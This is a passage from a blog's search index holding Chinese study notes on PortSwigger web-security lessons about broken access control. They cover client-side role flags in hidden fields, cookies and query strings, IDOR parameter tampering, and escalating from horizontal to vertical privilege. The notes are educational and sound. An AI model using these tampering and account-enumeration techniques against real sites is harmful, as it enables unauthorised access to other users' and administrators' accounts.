abnf">❌ 错误：用户登录 → 角色<span class="hljs-operator">=</span><span class="hljs-number">1</span> → 塞进 Cookie/隐藏域 → 每次请求带上 → 服务器信了<br>✅ 正确：用户登录 → 角色<span class="hljs-operator">=</span><span class="hljs-number">1</span> → 存在服务端 Session → 请求只带一个不透明会话 ID → 服务器自己查<br></code></pre></td></tr></table></figure><p>错误模式下，服务器做决策的数据来自客户端，而<strong>客户端的一切都是攻击者可控的</strong>——这就回到了那句核心原则：永远不要信任来自客户端的数据。</p><h4 id="三种载体"><a href="#三种载体" class="headerlink" title="三种载体"></a>三种载体</h4><p><strong>① 隐藏字段</strong></p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs abnf">&lt;form action<span class="hljs-operator">=</span><span class="hljs-string">&quot;/updateProfile&quot;</span>&gt; <br> &lt;input type<span class="hljs-operator">=</span><span class="hljs-string">&quot;hidden&quot;</span> name<span class="hljs-operator">=</span><span class="hljs-string">&quot;user_id&quot;</span> value<span class="hljs-operator">=</span><span class="hljs-string">&quot;1001&quot;</span>&gt; <br>  &lt;input type<span class="hljs-operator">=</span><span class="hljs-string">&quot;hidden&quot;</span> name<span class="hljs-operator">=</span><span class="hljs-string">&quot;role&quot;</span> value<span class="hljs-operator">=</span><span class="hljs-string">&quot;user&quot;</span>&gt;<br>  &lt;/form&gt;<br></code></pre></td></tr></table></figure><p><strong>② Cookie</strong></p><figure class="highlight dart"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dart"><span class="hljs-title class_">Cookie</span>: <span class="hljs-title class_">Admin</span>=<span class="hljs-keyword">false</span>;<br></code></pre></td></tr></table></figure><p><strong>③ 查询字符串参数</strong></p><p><code>?admin=true</code>、<code>?role=1</code></p><p><strong>实操</strong></p><p><img src="/blog/img/server-vuln-6.png" alt="基于参数的访问控制实操（一）：篡改请求参数提权"></p><p><img src="/blog/img/server-vuln-7.png" alt="基于参数的访问控制实操（二）：以提升后的权限查看敏感功能"></p><h3 id="水平越权（Horizontal-privilege-escalation）"><a href="#水平越权（Horizontal-privilege-escalation）" class="headerlink" title="水平越权（Horizontal privilege escalation）"></a>水平越权（Horizontal privilege escalation）</h3><p>如果用户能够访问属于<strong>其他用户</strong>的资源，而不是自己的同类资源，就会发生水平越权。例如，某员工不仅能查看自己的记录，还能访问其他员工的记录，这就是水平越权。</p><p>水平越权攻击的利用手法可能与垂直越权类似。例如，用户可能通过如下 URL 访问自己的账户页面：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">https://insecure-website.com/myaccount?<span class="hljs-built_in">id</span>=123<br></code></pre></td></tr></table></figure><p>如果攻击者把 <code>id</code> 参数的值改成另一个用户的值，就可能访问到其他用户的账户页面，以及与之关联的数据和功能。</p><p><strong>注意（Note）</strong></p><p>这是一个不安全的直接对象引用（Insecure Direct Object Reference，IDOR）漏洞的例子。这类漏洞产生于：<strong>用户可控的参数值被用来直接访问资源或功能</strong>。</p><p>在某些应用中，可被利用的参数没有可预测的值。例如，应用可能不使用递增数字，而是使用全局唯一标识符（GUID）来标识用户。这可能让攻击者无法猜测或预测其他用户的标识符。然而，其他用户的 GUID 可能在应用中引用用户的<strong>其他位置</strong>泄露出来，比如用户消息或评论里。</p><blockquote><p>攻击思路：通过水平越权遍历其他账户，直到找到权限更高的账户。</p></blockquote><p><strong>实操</strong></p><p><img src="/blog/img/server-vuln-8.png" alt="水平越权实操（一）"></p><p><img src="/blog/img/server-vuln-9.png" alt="水平越权实操（二）"></p><h2 id="三、水平到垂直权限升级"><a href="#三、水平到垂直权限升级" class="headerlink" title="三、水平到垂直权限升级"></a>三、水平到垂直权限升级</h2><p>通常，横向权限升级攻击可以通过破坏更高权限用户而转变为垂直权限升级。例如，水平升级可能允许攻击者重置或捕获属于其他用户的密码。如果攻击者针对管理员用户并攻破其账户，则可以获得管理员访问权限，从而进行垂直权力提升。</p><p>攻击者可能能够利用已描述的水平权限升级参数篡改技术，访问另一用户的账户页面：</p><p><code>https://insecure-website.com/myaccount?id=456</code></p><p>如果目标用户是应用管理员，攻击者将获得管理员账户页面的访问权限。该页面可能会泄露管理员密码或提供更改密码的方式，或者直接访问特权功能。</p><p><strong>实操</strong></p><p><img src="/blog/img/server-vuln-10.png" alt="水平到垂直权限升级实操"></p>]]></content>
      
      
      <categories>
          
          <category> 学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web安全 </tag>
            
            <tag> PortSwigger </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>博客已就绪</title>
      <link href="/blog/2026/09/15/20260915-%E5%8D%9A%E5%AE%A2%E5%B7%B2%E5%B0%B1%E7%BB%AA/"/>
      <url>/blog/2026/09/15/20260915-%E5%8D%9A%E5%AE%A2%E5%B7%B2%E5%B0%B1%E7%BB%AA/</url>
      
        <content type="html"><![CDATA[<p>欢迎来到我的博客。</p><p>这里会记录学习笔记、生活见闻，以及一切值得留下的东西。第一篇正式文章正在路上。</p>]]></content>
      
      
      <categories>
          
          <category> 随笔 </category>
          
      </categories>
      
      
    </entry>
    
    
  
  
</search>
